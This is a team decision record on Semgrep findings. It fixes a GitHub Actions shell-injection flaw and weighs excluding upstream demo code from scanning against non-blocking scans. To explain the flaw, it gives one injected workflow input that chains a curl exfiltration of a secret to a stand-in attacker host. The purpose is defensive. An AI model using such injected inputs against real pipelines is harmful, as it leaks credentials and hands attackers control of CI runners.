# SAST Findings Handling — Decision Record

Applied on 2026-04-30.

---

## Context

Running the Semgrep SAST job against this repository produced 33 blocking findings
across two distinct sources:

| Source | Count | Ownership |
|--------|-------|-----------|
| `.github/workflows/build-push.yml` | 1 | **This team — must fix** |
| `src/` (Google Online Boutique demo) | 32 | Upstream — not written by this team |

These two categories require different responses. Treating them the same — either
ignoring everything or blocking on everything — is wrong in both directions.

---

## Finding 1 — Shell Injection in Workflow (Fixed)

**Rule:** `yaml.github-actions.security.run-shell-injection`

**What it flagged:**

```yaml
# before — vulnerable
run: |
  if [ "${{ github.event_name }}" = "workflow_dispatch" ]; then
    INPUT="${{ github.event.inputs.services }}"
```

`github.event_name` and `github.event.inputs.services` are user-controlled values.
If an attacker (or a confused user) passes a malicious string as the `services`
workflow input, the shell on the runner would execute it. For example, an input
of `frontend; curl attacker.com/exfil?token=$AZURE_CLIENT_ID` would run the curl
command with access to all secrets available to the job.

**Fix applied — pass via `env:` block:**

```yaml
# after — safe
env:
  EVENT_NAME: ${{ github.event_name }}
  SERVICES_INPUT: ${{ github.event.inputs.services }}
run: |
  if [ "$EVENT_NAME" = "workflow_dispatch" ]; then
    INPUT="$SERVICES_INPUT"
```

**Why this works:** GitHub evaluates `${{ ... }}` expressions before the shell
sees the string. When the interpolated value goes directly into a `run:` block,
the shell receives and executes it. When it is assigned to an `env:` key first,
GitHub passes it as an environment variable — the shell reads the variable's
*value*, not its *content as code*. Injected shell metacharacters
(`;`, `|`, `$()`, backticks) are treated as literal characters, not operators.

**Rule of thumb:** Never interpolate `github.*`, `inputs.*`, or any other
user-controlled context value directly into a `run:` block. Always use `env:`.

---

## Finding 2 — Upstream Demo Source Code (32 findings)

All remaining findings are in `src/` — Google's Open Boutique microservices demo.
This is third-party upstream code, not written or maintained by this team.

### What was found and why it exists in the demo

| Rule | File(s) | Root cause in demo |
|------|---------|--------------------|
| `grpc-server-insecure-connection` | `shippingservice/main.go` | Demo skips mTLS — no certificate infrastructure set up |
| `grpc-nodejs-insecure-connection` | `currencyservice/client.js` | Same — demo uses plaintext gRPC |
| `cookie-missing-httponly` | `frontend/handlers.go`, `middleware.go` | Demo runs over plain HTTP; HttpOnly has no effect without HTTPS |
| `cookie-missing-secure` | `frontend/handlers.go`, `middleware.go` | Same — Secure flag requires HTTPS |
| `use-tls` | `frontend/main.go` | Demo serves HTTP directly; TLS termination is at the load balancer in prod |
| `math-random-used` | `frontend/handlers.go`, `shippingservice/tracker.go` | Non-cryptographic use (display session IDs, tracking IDs) but flagged regardless |
| `unquoted-attribute-var` | `frontend/templates/*.html` | Go's `html/template` auto-escapes output — mostly false positives, but rule fires on syntax |
| `var-in-href` | `frontend/templates/*.html` | Same — Go template engine handles XSS escaping, rule does not know this |
| `missing-user-entrypoint` | `loadgenerator/Dockerfile` | Demo convenience — load generator runs as root in test namespace |
| `avoid_app_run_with_bad_host` | `shoppingassistantservice/*.py` | `0.0.0.0` is correct inside a container; the port is not publicly exposed |

### Are these real issues?

Yes — in production code, every one of these would be a valid finding worth fixing.
In the demo they are accepted trade-offs: the app is designed to run in a Kubernetes
cluster where network policies, mTLS (via a service mesh), and TLS termination at the
ingress layer handle the concerns that the demo code skips at the application layer.

---

## Option A — `.semgrepignore` (Applied)

Create a `.semgrepignore` file at the repo root that excludes the upstream `src/`
directory from Semgrep scanning.

**File created: `.semgrepignore`**

```
src/
```

**Effect:**
- Semgrep skips all files under `src/` — zero findings from upstream demo code
- Semgrep still scans workflow files, scripts, infrastructure code, and anything
  else this team owns — new issues introduced by this team are caught
- Trivy SCA is a separate tool and is unaffected — it continues to scan `src/`
  for dependency CVEs independently

**When to use Option A:**
- `src/` is entirely upstream / vendored / generated code not owned by this team
- You want the SAST gate to remain blocking — findings from team-owned code still
  fail the pipeline
- You accept that security issues in upstream code are managed separately (e.g.
  by tracking them in a backlog, waiting for upstream fixes, or using dependency
  scanning rather than SAST)

**How to implement:**

```bash
# Create .semgrepignore at repo root
cat > .semgrepignore << 'EOF'
# Upstream demo code — not owned by this team
src/
EOF
```

**Reverting for a custom service:** If this team adds a new service under `src/`,
remove that directory from `.semgrepignore` so it is scanned:

```
# .semgrepignore — after adding src/myservice/ owned by this team
src/adservice/
src/cartservice/
# ... list all upstream services individually, omit myservice/
```

---

## Option B — SAST Reports but Does Not Block (`exit-code: '0'`)

Change the Semgrep step in `build-push.yml` to report findings without failing
the pipeline. Findings are still uploaded to the GitHub Security tab.

**Change required in `.github/workflows/build-push.yml`:**

```yaml
# before — blocks pipeline on any finding
- name: Semgrep — multi-language static analysis
  uses: semgrep/semgrep-action@v1
  with:
    config: >-
      p/security-audit
      ...

# after — reports findings, never blocks
- name: Semgrep — multi-language static analysis
  uses: semgrep/semgrep-action@v1
  with:
    config: >-
      p/security-audit
      ...
  env:
    SEMGREP_APP_TOKEN: ${{ secrets.SEMGREP_APP_TOKEN }}
  continue-on-error: true        # pipeline proceeds even if Semgrep exits non-zero
```

Or alternatively, if using the `semgrep` CLI directly:

```yaml
run: semgrep --config=auto src/ --sarif --output=semgrep.sarif || true
```

**Effect:**
- All findings are uploaded to the GitHub Security tab for visibility
- The pipeline never fails at the SAST step, regardless of what is found
- Developers must proactively review the Security tab — there is no enforcement gate

**When to use Option B:**
- The codebase has a large backlog of existing findings that cannot be fixed before
  shipping and blocking would halt all development
- You are onboarding SAST incrementally — report first, then enforce once the
  backlog is cleared
- All findings, including critical ones in code owned by this team, should be
  treated as informational (not recommended for production pipelines)

**Risk:** Without a blocking gate, findings accumulate silently. Teams tend to
stop reviewing the Security tab once they know the pipeline passes regardless.
Option B should be a temporary state with a plan to re-enable blocking.

---

## Comparison

| Dimension | Option A — semgrepignore | Option B — exit-code 0 |
|-----------|--------------------------|------------------------|
| Pipeline blocks on upstream findings | No | No |
| Pipeline blocks on team-owned code findings | **Yes** | No |
| Upstream findings visible in Security tab | No | Yes |
| Team-owned findings visible in Security tab | Yes | Yes |
| Suitable for permanent use | Yes | Temporary only |
| Effort to implement | Create one file | Change one line |
| Effort to reverse | Delete the file | Change one line back |

---

## Files Changed

| File | Change |
|------|--------|
| `.github/workflows/build-push.yml` | Shell injection fix — `github` context moved to `env:` |
| `.semgrepignore` | Created — excludes `src/` upstream demo code from Semgrep |
| `docs/sast-findings-handling.md` | This document |
